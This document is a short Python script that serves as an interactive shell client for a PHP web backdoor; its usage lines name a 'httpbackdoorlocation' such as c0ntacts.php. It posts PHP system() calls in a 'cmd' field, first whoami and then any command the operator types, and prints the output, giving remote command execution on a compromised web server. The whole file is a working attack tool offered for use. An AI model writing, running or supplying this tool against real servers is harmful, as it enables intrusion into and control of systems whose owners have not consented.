#!/usr/bin/python3
import requests
import sys
arguments=sys.argv
scriptname=arguments[0]
session=requests.Session()

def gethostname(url):
	if 'https://' in url:
		hostname=url.split('https://')[1].split('/')[0]
	elif 'http://' in url:
		hostname=url.split('http://')[1].split('/')[0]
	else:
		hostname=""
	return hostname
		


if(len(arguments) == 2):
	url=arguments[1]
	command=""
	payload=f"system('whoami');"
	user=(session.post(url,data={"cmd":f"{payload}"}).text).strip()
	if user.strip() == '':
		print(f"No valid user found.Check connection")
		exit()
	user=f"{user}@{gethostname(url)}"
	exits='q exit'.split(' ')
	while command not in exits:
		command=input(f"{user} > ")
		if command == 'space':
			line="\n"
			print(f"{line * 256}")
		else:
			payload=f"system('{command} 2>/dev/null');"
			response=session.post(url,data={"cmd":f"{payload}"})
			content=response.text
			try:
				content=content.decode().strip()
			except:
				content=content.strip()

			print(f'{content}\n')
else:
	print(f'\tUsage : {scriptname} httpbackdoorlocation com')
	print(f'\t      : {scriptname} http://localhost/tests/c0ntacts.php')
	print(f'\t      : {scriptname} http://localhost/tests/c0ntacts.php ')
